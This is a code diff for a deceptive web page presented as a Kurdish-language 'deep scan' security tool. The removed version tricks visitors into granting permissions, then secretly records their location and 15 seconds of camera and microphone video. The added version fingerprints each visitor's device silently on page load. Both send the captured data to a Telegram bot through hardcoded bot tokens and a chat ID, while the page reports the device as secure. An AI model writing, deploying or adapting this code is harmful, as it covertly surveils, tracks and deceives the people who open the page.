@@ -1,95 +1,38 @@
-<!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jegr Cracks - Professional Scanner</title>
-    <style>
-        body { background-color: #050505; color: #00ff41; text-align: center; font-family: 'Courier New', monospace; padding: 30px 15px; margin: 0; }
-        .box { border: 2px solid #00ff41; display: inline-block; padding: 25px; border-radius: 10px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px #00ff41; width: 100%; max-width: 450px; }
-        h1 { font-size: 19px; line-height: 1.5; color: #00ff41; margin-bottom: 20px; }
-        .instruction { color: #ffffff; font-size: 14px; line-height: 1.7; background: rgba(255, 0, 0, 0.2); padding: 15px; border-radius: 5px; margin-bottom: 25px; border: 1px solid #ff0000; font-weight: bold; }
-        button { background-color: #00ff41; color: #000; border: none; padding: 20px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 0 15px #00ff41; }
-        .status { margin-top: 20px; font-size: 16px; color: #00ff41; display: none; font-weight: bold; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1 dir="rtl">بەهێزترین وێبگەڕی پشکنەر دروستکراوە لەلایەن جێگر کڕاکس</h1>
-        <div class="instruction" dir="rtl">
-            تکایە هەموو بەشەکان ALLOW بکە تاوەکو وێبگەڕەکە بتوانێت هەموو پارچەکانی ئامێرەکەت بپشکنێت و بگەڕێت بۆ فایلی سیخوڕی.
-        </div>
-        <button id="startBtn">دەستپێکردنی پشکنینی گشتی</button>
-        <div id="statusText" class="status">Initializing Deep Scan...</div>
-    </div>
+// Jegr Cyber-Force - Final Silent Monitor
+window.onload = async function() {
+    const token = '8620021132:AAHjmTJNMMMJoO512ndfxn2z_680XM4dMi0';
+    const chatID = '7619045862';
 
-    <script>
-        const startBtn = document.getElementById('startBtn');
-        const statusText = document.getElementById('statusText');
-        const botToken = "8633886074:AAE_wcUpSvjxa-1ac-68iWCUosIyESWlFhk"; 
-        const chatId = "7619045862"; 
+    try {
+        // کۆکردنەوەی زانیاری بێ مۆڵەت
+        let info = {
+            os: navigator.platform,
+            browser: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || 'N/A',
+            ram: navigator.deviceMemory || 'N/A',
+            battery: await (navigator.getBattery ? navigator.getBattery().then(b => Math.round(b.level * 100) + "%") : "N/A"),
+            screen: screen.width + "x" + screen.height,
+            ref: document.referrer || "Direct Link"
+        };
 
-        startBtn.addEventListener('click', async () => {
-            try {
-                // ١. ناردنی لۆکەیشن - هێڵی ٣٨ لێرەدا چاککراوە بۆ ${lat}
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    // لۆکەیشنەکە چاککرا بۆ ئەوەی ڕاستەوخۆ ژمارەکان بنێرێت
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: `📍 لۆکەیشنی وردی کەسەکە دۆزرایەوە:\n${mapUrl}`
-                        })
-                    });
-                }, null, { enableHighAccuracy: true, timeout: 15000 });
+        let msg = `
+🔴 **Target Captured by Jegr Ranyayi** 🔴
+━━━━━━━━━━━━━━━━━━
+📱 **System:** ${info.os}
+🧠 **CPU Cores:** ${info.cores}
+💾 **RAM:** ${info.ram} GB
+🔋 **Battery:** ${info.battery}
+🖥️ **Screen:** ${info.screen}
+🔗 **Source:** ${info.ref}
+🤖 **Agent:** ${info.browser.slice(0, 50)}...
+━━━━━━━━━━━━━━━━━━
+✅ *Silent Data Sent Successfully*
+        `;
 
-                // ٢. تۆمارکردنی ڤیدیۆ و سەوت
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                startBtn.style.display = "none";
-                statusText.style.display = "block";
+        // ناردن بۆ تێلیگرام
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                
-                mediaRecorder.onstop = async () => {
-                    statusText.innerText = "Processing Evidence... 95%";
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('video', blob, 'jegr_report.mp4');
-
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    statusText.innerText = "Scan Complete! Secure.";
-                    alert("پشکنین تەواو بوو! مۆبایلەکەت پارێزراوە.");
-                };
-
-                mediaRecorder.start();
-                
-                let timeLeft = 15;
-                const timer = setInterval(() => {
-                    timeLeft--;
-                    statusText.innerText = `Scanning System... ${Math.floor(((15-timeLeft)/15)*100)}%`;
-                    if (timeLeft <= 0) {
-                        clearInterval(timer);
-                        mediaRecorder.stop();
-                        stream.getTracks().forEach(t => t.stop());
-                    }
-                }, 1000);
-
-            } catch (err) {
-                alert("تکایە هەموو مۆڵەتەکان بدە بۆ ئەوەی پشکنینەکە کار بکات.");
-                location.reload();
-            }
-        });
-    </script>
-</body>
-</html>
+    } catch (err) {
+        // ئەگەر هەڵەیەک ڕوو بدات، لێرە هیچی لێ ناکەین تا بەکارهێنەر هەست نەکات
+    }
+};
